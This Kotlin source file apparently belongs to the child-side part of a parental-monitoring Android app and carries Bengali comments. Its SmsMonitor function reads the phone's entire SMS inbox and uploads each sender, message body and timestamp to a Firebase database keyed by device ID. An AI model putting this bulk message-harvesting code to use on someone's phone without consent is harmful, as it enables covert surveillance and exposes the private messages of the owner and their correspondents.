package com.surokkhanet.child

import android.Manifest
import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.Settings
import androidx.core.content.ContextCompat
import com.google.firebase.database.FirebaseDatabase

object SmsMonitor {
    fun monitorSms(context: Context) {
        // SMS পড়ার অনুমতি আছে কিনা তা পরীক্ষা করা হচ্ছে
        if (ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            // অনুমতি না থাকলে ফাংশন থেকে বেরিয়ে যাবে
            return
        }

        val resolver: ContentResolver = context.contentResolver
        // ফোনের ইনবক্স থেকে SMS মেসেজগুলো আনা হচ্ছে এবং নতুনগুলো আগে পাওয়ার জন্য তারিখ অনুযায়ী সাজানো হচ্ছে
        val cursor: Cursor? = resolver.query(
            Uri.parse("content://sms/inbox"),
            null,
            null,
            null,
            "date DESC" // নতুন মেসেজ আগে দেখানোর জন্য DESC (Descending) অর্ডারে সাজানো
        ) ?: return // যদি কোনো মেসেজ না থাকে, তাহলে এখান থেকেই বেরিয়ে যাবে

        cursor.use {
            // যদি কার্সারে অন্তত একটি মেসেজ থাকে
            if (it.moveToFirst()) {
                // ডেটা কলামের ইন্ডেক্স নম্বরগুলো নিয়ে নেওয়া হচ্ছে
                val bodyIndex = it.getColumnIndex("body")
                val addressIndex = it.getColumnIndex("address")
                val dateIndex = it.getColumnIndex("date")

                // Firebase ডেটাবেসের সাথে সংযোগ স্থাপন করা হচ্ছে
                val db = FirebaseDatabase.getInstance()
                // প্রতিটি ডিভাইসের জন্য আলাদাভাবে SMS সেভ করার জন্য Device ID ব্যবহার করা হচ্ছে
                val ref = db.getReference("sms/${context.getDeviceId()}")

                // সব মেসেজ শেষ না হওয়া পর্যন্ত লুপ চলতে থাকবে
                do {
                    val body = it.getString(bodyIndex) ?: ""
                    val address = it.getString(addressIndex) ?: "Unknown"
                    val date = it.getLong(dateIndex)

                    // Firebase ডেটাবেসে ডেটা পাঠানো হচ্ছে
                    ref.push().setValue(mapOf(
                        "from" to address,
                        "message" to body,
                        "timestamp" to date
                    ))
                } while (it.moveToNext())
            }
        }
    }
}

// ডিভাইসের একটি স্বতন্ত্র আইডি (Unique ID) বের করার জন্য এই ফাংশনটি তৈরি করা হয়েছে
@SuppressLint("HardwareIds")
fun Context.getDeviceId(): String {
    return Settings.Secure.getString(
        contentResolver,
        Settings.Secure.ANDROID_ID
    )
}